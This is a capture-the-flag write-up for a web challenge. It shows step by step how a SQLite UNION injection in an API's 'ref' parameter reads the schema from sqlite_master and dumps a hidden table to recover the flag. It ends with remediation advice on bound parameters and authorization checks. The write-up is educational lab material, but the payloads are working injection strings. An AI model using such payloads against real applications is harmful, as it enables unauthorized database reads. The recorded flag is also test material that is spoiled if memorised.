# Postmarked: Never

[中文](README.zh-CN.md) · Mimic CTF 2026 · Web · 100 points · [Challenge page](https://ctf.rarebytehub.com/events/mimic/writeups/challenge/postmarked-never)

| Category | Points | Input | Result |
|---|---:|---|---|
| Web | 100 | JSON API | SQLite UNION injection |

[Original prompt and attachments](PROMPT.md) · [Official solution](https://ctf.rarebytehub.com/events/mimic/writeups/official-solution-postmarked-never) · [Historical instance](http://98.80.121.178:9001) · [Event links](../../OFFICIAL-LINKS.md)


The page appears to expose only selected memories. Its JavaScript fetches `/api/v2/memory?ref=...&fmt=html`, revealing the actual lookup endpoint. The official solution documents the response differences used below; this article does not infer server source from an error message.

## 1. Establish an injectable expression

Compare an ordinary reference, `1`, with sealed reference `7`. Then keep the reference fixed and change only a boolean expression:

```text
1 AND 1=1    normal matching response
1 AND 1=2    no matching content
```

That true/false pair supports SQL expression evaluation in `ref`. Raw SQL errors are not needed and are not exposed in the official account. A silent failure alone cannot identify either the database or its column names.

## 2. Find the result width and visible column

Start the left side with an absent reference, `0`, so a normal row does not obscure the injected result. Probe the number of selected expressions:

```sql
0 UNION SELECT 1--
0 UNION SELECT 1,2--
0 UNION SELECT 1,2,3--
```

The one- and two-column versions fail to produce the desired result; the three-column version displays `3`. UNION branches must have the same column count, so three expressions fit this query, and the third column reaches the rendered body. The comment terminates any trailing SQL; it does not reveal what that trailing SQL was.

## 3. Let the schema identify the next table

```sql
0 UNION SELECT name,2,sql FROM sqlite_master--
```

SQLite's schema catalog yields the table definitions. One relevant table is `unsent_letters(id,addressed_to,body)`. Reading this definition is stronger evidence than guessing a hidden table name from the story, and avoids reconstructing an unsupported base query.

## 4. Put the letter body in column three

```sql
0 UNION SELECT addressed_to,2,body FROM unsent_letters--
```

The third expression is `body`. With `fmt=json`, the output field named `snippet` carries that third expression; the first expression provides the addressee. URL-encode the SQL as the value of `ref` when constructing a URL. HTML also displays the body; JSON makes the field placement easier to inspect.

The recovered letter contains:

```text
RBH{th3_1nk_0utl1v3d_th3_g00dbye}
```

## Local model and remediation

```powershell
python src/solvers/postmarked-never/mechanism_demo.py
```

The [SQLite example](../../../src/solvers/postmarked-never/mechanism_demo.py) constructs an illustrative three-column query using synthetic `DEMO_ONLY` data. It demonstrates the distinction between concatenated SQL and a bound parameter. Its schema and query are teaching fixtures, not recovered server source.

Bind parameters and validate the identifier's intended type so input remains data. Separately enforce authorization for each returned resource. A correctly bound query can still have an authorization defect; a display predicate alone does not establish who may read a letter.

[Reproducibility guide](../../REPRODUCIBILITY.md) · [Source and license](../../ABOUT.md)
